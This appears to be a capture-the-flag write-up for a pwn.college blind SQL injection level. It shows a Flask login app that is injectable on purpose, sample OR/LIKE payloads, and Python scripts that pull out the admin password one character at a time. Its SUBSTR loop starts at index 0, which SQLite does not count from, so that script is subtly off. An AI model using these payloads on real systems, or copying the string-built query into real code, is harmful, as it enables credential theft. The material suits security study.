This level doesn't return anything from the query. So we'll need to make use of the error functionality of the website and try to brute-force the password.

```python
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)

import sqlite3
import tempfile

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()

# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])

# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, 'password' as password""")

@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")

    if not username:
        flask.abort(400, "Missing `username` form parameter")

    if not password:
        flask.abort(400, "Missing `password` form parameter")

    try:
        # https://www.sqlite.org/lang_select.html
        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
        print(f"DEBUG: {query=}")
        user = db.execute(query).fetchone()
    except sqlite3.Error as e:
        flask.abort(500, f"Query: {query}\nError: {e}")

    if not user:
        flask.abort(403, "Invalid username or password")

    flask.session["user"] = username
    return flask.redirect(flask.request.path)

@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.session.get("user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"

    return (
        page
        + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Password:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """
    )

app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

I tested some simple wildcard brute-force on the `guest` account (which have a known password: `password`).

```
User: guest
Password: ' OR password LIKE 'a%'--
```

This returns an "Invalid username or password" error message since the password of `guest` doesn't start with the letter `a`.

```
User: guest
Password: ' OR password LIKE 'p%'--
```

This logged us in because the password of `guest` does start with the letter `p`. Now comes the brute-force. We can use python to try to brute-force it. We can't really use `LIKE` for this since it's case insensitive.

First, we'll need to figure figure out what the length of the flag is. We'll need to use the `requests` library:

```python
import requests

# parameters
url = "http://challenge.localhost:80"
user_to_guess = "admin"

# find flag length
flag_length = 0
for i in range(1, 100):
    print(f"Checking password length: {i}")
    content = {"username":user_to_guess, "password":f"' OR (SELECT 'a' FROM users WHERE username='{user_to_guess}' and LENGTH(password) > {i}) = 'a'--"}
    res = requests.post(url, data=content)
    if "Invalid" in res.text:
        flag_length = i
        break
print("Flag length: " + str(flag_length))
```

It basically uses the `LENGTH` function in SQL on the flag and check out flag length with the actual flag length. If our flag length is equal to the actual flag length, we'd get an error response, which indicate that we have our flag length.

Now that we have the flag length, we can brute-force it. We'll need to create a set of words to check.

```python
import string
# create word set
word_set = ""
word_set += string.ascii_letters
word_set += string.digits
word_set += "-.{}"
print("Word set: " + word_set)
```

Now we can brute-force it. We just use the `SUBSTR` function to get the `ith` character from the flag and compare it with each one of the characters in our word set. If they match, the response text would not return an invalid message.

```python
# brute-force flag
flag = ""
for i in range(flag_length):
    for letter in word_set:
        content = {"username":user_to_guess, "password":f"' OR (SELECT SUBSTR(password, {i}, 1) FROM users WHERE username = '{user_to_guess}') = '{letter}'--"}
        res = requests.post(url, data=content)
        if "Invalid" not in res.text:
	        flag += letter
	        break
    print(f"Current flag: {flag}")
print("Final flag: " + flag)
```